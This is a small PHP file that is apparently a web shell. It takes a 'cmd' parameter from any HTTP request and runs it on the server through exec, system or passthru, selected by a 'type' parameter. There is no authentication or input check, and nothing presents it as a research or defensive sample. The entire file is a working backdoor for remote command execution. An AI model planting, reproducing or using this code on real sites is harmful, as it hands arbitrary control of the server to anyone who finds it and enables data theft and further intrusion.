<?php
$type = $_REQUEST['type'];
$Mcmd = $_REQUEST['cmd'];
function Mexec($Mcmd, $type) {
	$output = "";
	switch($type) {
		case 5:
			$output .= "<pre>";
			$lastline = exec($Mcmd, $arrOutput);
			foreach($arrOutput as $val) {
				$output .= $val . "\n";
			}
			$output .= "</pre>";
			break;
		case 2;
			print "<pre>\n";
			$output = system($Mcmd);
			print "</pre>\n";
			break;
		case 1;
			print "<pre>\n";
			$output = passthru($Mcmd);
			print "</pre>\n";
			break;
		default;
			$output = "There are no execute functions available!";
			break;
	}
	return $output;
}

echo "end";
Mexec($Mcmd, $type);
?>